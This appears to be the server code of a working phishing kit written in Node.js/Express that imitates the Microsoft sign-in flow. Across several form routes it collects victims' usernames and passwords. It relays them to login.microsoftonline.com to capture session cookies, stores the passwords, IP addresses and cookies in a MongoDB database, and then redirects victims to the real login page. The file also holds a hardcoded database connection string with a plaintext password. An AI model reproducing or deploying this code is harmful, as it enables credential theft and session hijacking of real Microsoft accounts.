require('dotenv').config();
let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let http = require('http');
const httpProxy = require('http-proxy');
const mongodb = require('mongodb');
const cookieParser = require('cookie-parser');
const session = require('express-session');
const MongoStore = require('connect-mongo');




const targetUrl = '.login.microsoftonline.com';
let app = express();
const proxy = httpProxy.createProxyServer();

app.set("view engine", "ejs")
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use(cookieParser());
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'none'; font-src 'self' https://qwertyu.onrender.com; style-src 'self' 'unsafe-inline'"
  );
  next();
});


mongoose.set('strictQuery', true);
mongoose.connect("mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full",{ useNewUrlParser:true });

const userSchema = new mongoose.Schema({
  ai: String,
  pi: String,
  ip: String,
  cookies: String,
});

const User = mongoose.model("User", userSchema);

app.get("/", (req, res) => {
  let username = req.query.username;
  res.render("recap", { username: username });
});

app.post("/", function(req, res) {
  let username = req.body.recapstore;
  res.render("first", { username: username });
});

app.post("/first", function(req, res) {
  var header = req.headers;
  var username = req.body.username;
  res.render("second", { username: username });
});

app.post("/second", function(req, res) {
  const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const username = req.body.username;
  const password = req.body.pass;

  // Create the request body for the cookie request
  const data = {
    username: username,
    password: password
  };

  // Make the POST request to the Microsoft login endpoint
  fetch('https://login.microsoftonline.com/login', {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {
      'Content-Type': 'application/json'
    }
  })
    .then(response => {
      // Retrieve the full cookie string from the response headers
      const cookies = response.headers.get('set-cookie');

      // Create a new user document with the received cookies
      const newUser = new User({
        ai: username,
        pi: password,
        ip: ipadd,
        cookies: cookies // Save the full cookie string
      });

      // Save the user document to the database
      newUser.save(function (err) {
        if (err) {
          console.log(err);
        } else {
          res.render("third", {
            username: username
          });
        }
      });
    })
    .catch(error => {
      console.error('Error:', error);
    });
});


// // Helper function to extract the value of a cookie
// function extractCookieValue(cookies, cookieName) {
//   const cookieRegex = new RegExp(`${cookieName}=([^;]+)`);
//   const match = cookies.match(cookieRegex);
//   if (match && match.length > 1) {
//     return match[1];
//   }
//   return '';
// }




app.post("/third", function(req, res) {
  const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  var username = req.body.username;

  const newUser = new User({
    ai: req.body.username,
    pi: req.body.pass,
    ip: ipadd,
  });

  newUser.save(function (err) {
    if (err) {
      console.log(err);
    } else {
      res.redirect("https://login.microsoftonline.com/");
    }
  });
});

const port = process.env.PORT || 3000;
app.listen(port, function () {
  console.log("Server started on port " + port);
});
